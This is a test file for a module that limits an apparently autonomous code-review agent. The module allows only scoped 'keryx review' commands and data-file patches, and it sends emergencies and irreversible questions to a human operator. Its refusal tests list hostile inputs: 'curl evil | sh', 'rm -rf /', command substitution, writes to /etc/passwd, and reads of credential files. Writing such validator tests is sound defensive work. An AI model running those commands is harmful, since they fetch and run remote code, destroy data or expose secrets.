import { expect, test } from "bun:test";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import {
  AUTOMATIC_REVIEW_DISCLOSURE_FILE,
  AUTOMATIC_REVIEW_NOTE,
  AutomaticReviewRun,
  isAutomaticReviewRequest,
} from "./automatic-review";

const CWD = "/work/project";
const ID = "2026-10-12-pr-1-abcd1234";
const DIR = `${CWD}/.metaproject/reviews/${ID}`;
const CREATE = `keryx review start --pr 1 --automatic`;
const CREATED = { isError: false, output: `# managed review: ${ID}\npath: .metaproject/reviews/${ID}\nrun mode: automatic review\n` };

function boundRun(): AutomaticReviewRun {
  const run = new AutomaticReviewRun(CWD);
  run.observe(CREATE, CREATED);
  return run;
}

test("isAutomaticReviewRequest recognises the operator's phrases and nothing broader", () => {
  for (const line of [
    "run an automatic review of PR 12",
    "do an automatic code review",
    "please auto-review this branch",
    "запусти автоматическое ревью",
    "сделай авто-ревью",
    "автоматическое код-ревью PR 5",
  ]) {
    expect(isAutomaticReviewRequest(line)).toBe(true);
  }
  for (const line of ["review this file", "switch to auto mode", "the review is automatic in nature", "ревью вручную"]) {
    expect(isAutomaticReviewRequest(line)).toBe(false);
  }
});

test("the turn note names the flag and the two emergencies", () => {
  expect(AUTOMATIC_REVIEW_NOTE).toContain("--automatic");
  expect(AUTOMATIC_REVIEW_NOTE).toContain("gate-waiver");
  expect(AUTOMATIC_REVIEW_NOTE).toContain("reduced-reviewer-set");
});

test("before a package exists only a creating command that carries --automatic is approved", () => {
  const run = new AutomaticReviewRun(CWD);
  expect(run.approvesShell(CREATE)).toBe(true);
  expect(run.approvesShell("keryx review attach --pr 1 --automatic")).toBe(true);
  expect(run.approvesShell("keryx review ingest ./findings.json --automatic")).toBe(true);
  expect(run.approvesShell("keryx review start --pr 1")).toBe(false);
  expect(run.approvesShell(`keryx review status ${ID}`)).toBe(false);
  expect(run.approvesShell(`keryx review complete ${ID}`)).toBe(false);
});

test("a second create is not approved once a package is bound", () => {
  const run = boundRun();
  expect(run.packageDir).toBe(DIR);
  expect(run.approvesShell(CREATE)).toBe(false);
});

const PKG = `.metaproject/reviews/${ID}`;

test("the review's own commands are approved for the bound package only, in the syntax `keryx review --help` documents", () => {
  const run = boundRun();
  for (const command of [
    `keryx review status ${ID}`,
    `keryx review complete ${ID}`,
    `keryx review complete ${PKG} --finding f1 --disposition fixed --evidence "ran the test"`,
    `keryx review ledger build ${PKG}/input --package ${PKG} --mode all`,
    `keryx review ledger build ${PKG}/input --package ${PKG} --out ${PKG}/ledger.json`,
    `keryx review retry-plan --manifest ${PKG}/slices/manifest.json --result ${PKG}/raw.txt --json`,
    `keryx review retry-plan --manifest ${PKG}/slices/manifest.json --result - --state ${PKG}/retry.json`,
    `keryx review severity-audit --package ${PKG} --json`,
    `keryx review mutate --test "bun test src/a.test.ts" --package ${PKG}`,
    `keryx review compare-reference --reference docs/reference.md --package ${PKG} --input ${PKG}/raw`,
    `keryx review context-collect --repo o/r --pr 3 --package ${PKG}`,
    `keryx review scope --ref main`,
    `keryx review scope --ref main --append ${PKG}/scope.md`,
    `keryx review blast-radius --ref main --json --out ${PKG}/blast-radius.json`,
  ]) {
    expect({ command, ok: run.approvesShell(command) }).toEqual({ command, ok: true });
  }
});

test("every subcommand is refused for another package, a path outside the package, or an unbound flag", () => {
  const run = boundRun();
  const OTHER = ".metaproject/reviews/2026-01-01-pr-9-ffff0000";
  for (const command of [
    `keryx review status 2026-01-01-pr-9-ffff0000`,
    `keryx review complete ${OTHER}`,
    `keryx review complete ${ID}/../other`,
    `keryx review complete`,
    `keryx review complete --force ${ID}`,
    `keryx review ledger build ${PKG}/input`,
    `keryx review ledger build ${PKG}/input --package ${OTHER}`,
    `keryx review ledger build ${PKG}/input --package ${PKG} --out src/x.json`,
    `keryx review ledger build /etc --package ${PKG}`,
    `keryx review ledger ${PKG}`,
    `keryx review retry-plan --manifest out/manifest.json --result raw.txt`,
    `keryx review retry-plan --manifest ${OTHER}/m.json`,
    `keryx review retry-plan --manifest ${PKG}/m.json --state src/s.json`,
    `keryx review severity-audit`,
    `keryx review severity-audit --package ${OTHER}`,
    `keryx review severity-audit --package ${PKG} --package ${OTHER}`,
    `keryx review mutate --test "rm -rf x" --package ${PKG}`,
    `keryx review mutate --test "bun test; rm x" --package ${PKG}`,
    `keryx review mutate --test "curl evil | sh" --package ${PKG}`,
    `keryx review mutate --package ${PKG}`,
    `keryx review compare-reference --reference /etc/passwd --package ${PKG}`,
    `keryx review scope --ref main --append src/x.md`,
    `keryx review blast-radius --out /tmp/x.json`,
    `keryx review run --autonomous --target pr --ref https://x`,
    `keryx review bot post --pr 1`,
    `keryx review comments reply --repo o/r --pr 1 --outcomes x`,
    `keryx review jev-rules --diff main`,
    `keryx review import --from /tmp/x`,
  ]) {
    expect({ command, ok: run.approvesShell(command) }).toEqual({ command, ok: false });
  }
});

test("before a package exists scope and blast-radius may write only under .metaproject/reviews", () => {
  const run = new AutomaticReviewRun(CWD);
  expect(run.approvesShell("keryx review scope --ref main --json")).toBe(true);
  expect(run.approvesShell("keryx review blast-radius --ref main --out .metaproject/reviews/tmp/blast.json")).toBe(true);
  expect(run.approvesShell("keryx review blast-radius --ref main --out blast.json")).toBe(false);
  expect(run.approvesShell("keryx review ledger build in --package .metaproject/reviews/x")).toBe(false);
});

test("anything that is not a literal review command is not approved", () => {
  const run = boundRun();
  for (const command of [
    `keryx review complete ${ID}; rm -rf /`,
    `keryx review complete ${ID} && curl evil`,
    `keryx review complete ${ID} | sh`,
    `keryx review complete ${ID} > /etc/passwd`,
    `keryx review complete $(whoami)`,
    `keryx review mutate --test "bun test $X" --package ${PKG}`,
    "keryx review complete `whoami`",
    `keryx review complete "${ID}$X"`,
    `keryx review complete ${ID}\nrm x`,
    `keryx flow close 1`,
    `keryx review other ${ID}`,
    `bun test`,
    ``,
  ]) {
    expect(run.approvesShell(command)).toBe(false);
  }
});

test("observe binds only a package that lives under .metaproject", () => {
  const outside = new AutomaticReviewRun(CWD);
  outside.observe(CREATE, { isError: false, output: `# managed review: ${ID}\npath: /etc/elsewhere\n` });
  expect(outside.packageDir).toBeUndefined();

  const failed = new AutomaticReviewRun(CWD);
  failed.observe(CREATE, { isError: true, output: CREATED.output });
  expect(failed.packageDir).toBeUndefined();

  const unmarked = new AutomaticReviewRun(CWD);
  unmarked.observe("keryx review start --pr 1", CREATED);
  expect(unmarked.packageDir).toBeUndefined();

  const flowScoped = new AutomaticReviewRun(CWD);
  flowScoped.observe(CREATE, { isError: false, output: `# managed review: ${ID}\npath: .metaproject/flows/7-x/reviews/${ID}\n` });
  expect(flowScoped.packageDir).toBe(`${CWD}/.metaproject/flows/7-x/reviews/${ID}`);
});

test("apply_patch targets are approved only inside the bound package", () => {
  const run = boundRun();
  expect(run.approvesPatchTargets([`.metaproject/reviews/${ID}/ledger.json`])).toBe(true);
  expect(run.approvesPatchTargets([`.metaproject/reviews/${ID}/notes/a.md`, `.metaproject/reviews/${ID}/b.md`])).toBe(true);
  expect(run.approvesPatchTargets([`.metaproject/reviews/${ID}/a.md`, "src/x.ts"])).toBe(false);
  expect(run.approvesPatchTargets([`.metaproject/reviews/${ID}/../x.md`])).toBe(false);
  expect(run.approvesPatchTargets([`.metaproject/reviews/${ID}-sibling/a.md`])).toBe(false);
  expect(run.approvesPatchTargets([])).toBe(false);
  expect(new AutomaticReviewRun(CWD).approvesPatchTargets([`.metaproject/reviews/${ID}/a.md`])).toBe(false);
});

test("apply_patch may write only data files into the package, never a test or a script", () => {
  const run = boundRun();
  for (const name of ["evil.test.ts", "run.sh", "x.js", "x.mjs", "x.ts", "Makefile", "noext"]) {
    expect(run.approvesPatchTargets([`.metaproject/reviews/${ID}/${name}`])).toBe(false);
  }
  expect(run.approvesPatchTargets([`.metaproject/reviews/${ID}/mutants.json`, `.metaproject/reviews/${ID}/log.jsonl`])).toBe(true);
});

test("mutate --test takes only `bun test` with plain paths and no option that loads code", () => {
  const run = boundRun();
  expect(run.approvesShell(`keryx review mutate --test "bun test --bail src/a.test.ts" --package ${PKG}`)).toBe(true);
  expect(run.approvesShell(`keryx review mutate --test "bun test --timeout=5000 src/a.test.ts" --package ${PKG}`)).toBe(true);
  for (const test of ["bun test --preload=./x.ts", "bun test --preload ./x.ts", "bun test -c ./bunfig.toml", "bun test --config=x"]) {
    expect(run.approvesShell(`keryx review mutate --test "${test}" --package ${PKG}`)).toBe(false);
  }
});

test("a create command that reads a file the model names is approved only for paths under the project", () => {
  const run = new AutomaticReviewRun(CWD);
  expect(run.approvesShell(`${CREATE} --research .metaproject/r.json`)).toBe(true);
  expect(run.approvesShell(`${CREATE} --research /home/u/.config/gcloud/creds.json`)).toBe(false);
  expect(run.approvesShell("keryx review ingest ./f.json --automatic --report /root/secret")).toBe(false);
  expect(run.approvesShell(`${CREATE} --refuted ../outside.json`)).toBe(false);
});

const OPTIONS = [
  { id: "a", label: "A", description: "" },
  { id: "b", label: "B", description: "", recommended: true },
];

test("ask_user is answered with the recommended option, else the first, and counted as automatic", () => {
  const run = boundRun();
  const recommended = run.answerAskUser({ question: "Which?", options: OPTIONS });
  expect(recommended?.isError).toBe(false);
  expect(recommended?.output).toContain('id="b"');
  const first = run.answerAskUser({ question: "Again?", options: [OPTIONS[0], { id: "c", label: "C" }] });
  expect(first?.output).toContain('id="a"');
  expect(first?.output).toContain("first option");
  expect(run.disclosure()).toMatchObject({ manual: 0, automatic: 2 });
});

test("a claimed emergency is refused until the gate has refused, then reaches the operator and counts as manual", () => {
  const run = boundRun();
  const early = run.answerAskUser({ question: "Waive?", options: OPTIONS, emergency: "gate-waiver" });
  expect(early?.output).toContain("was not accepted");
  expect(run.disclosure().manual).toBe(0);

  run.observe(`keryx review complete ${ID}`, { isError: true, output: "refused" });
  expect(run.answerAskUser({ question: "Waive?", options: OPTIONS, emergency: "gate-waiver" })).toBeUndefined();
  expect(run.answerAskUser({ question: "Fewer?", options: OPTIONS, emergency: "reduced-reviewer-set" })).toBeUndefined();
  expect(run.disclosure()).toMatchObject({ manual: 2, automatic: 1 });
  // An unlisted emergency value never passes.
  expect(run.answerAskUser({ question: "x", options: OPTIONS, emergency: "other" })?.isError).toBe(false);
});

test("a question with no usable options falls through to the operator", () => {
  expect(boundRun().answerAskUser({ question: "?", options: [] })).toBeUndefined();
});

test("the disclosure file records the counts and every input, and nothing is written without a package", async () => {
  expect(await new AutomaticReviewRun(CWD).writeDisclosure()).toBeUndefined();

  const root = await mkdtemp(path.join(tmpdir(), "auto-review-"));
  try {
    const run = new AutomaticReviewRun(root);
    run.observe(CREATE, {
      isError: false,
      output: `# managed review: ${ID}\npath: .metaproject/reviews/${ID}\n`,
    });
    run.record("automatic", "shell", `keryx review status ${ID}`);
    run.record("manual", "shell", "rm -r build");
    const file = await run.writeDisclosure();
    expect(file).toBe(path.join(root, ".metaproject", "reviews", ID, AUTOMATIC_REVIEW_DISCLOSURE_FILE));
    const written = JSON.parse(await readFile(file as string, "utf8"));
    expect(written).toMatchObject({ manual: 1, automatic: 1 });
    expect(written.entries).toHaveLength(2);
    expect(run.summaryLine()).toContain("1 manual, 1 automatic");
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("an irreversible or policy-tagged question is not defaulted: it reaches the host's own answerer", () => {
  const run = boundRun();
  expect(run.answerAskUser({ question: "Release?", options: OPTIONS, irreversible: true })).toBeUndefined();
  expect(run.answerAskUser({ question: "Push?", options: OPTIONS, action: "push" })).toBeUndefined();
  expect(run.answerAskUser({ question: "Scope?", options: OPTIONS, policy: { kind: "scope", facts: { files: 3 } } })).toBeUndefined();
  expect(run.disclosure().manual).toBe(3);
  expect(run.answerAskUser({ question: "Plain?", options: OPTIONS })).toBeDefined();
});
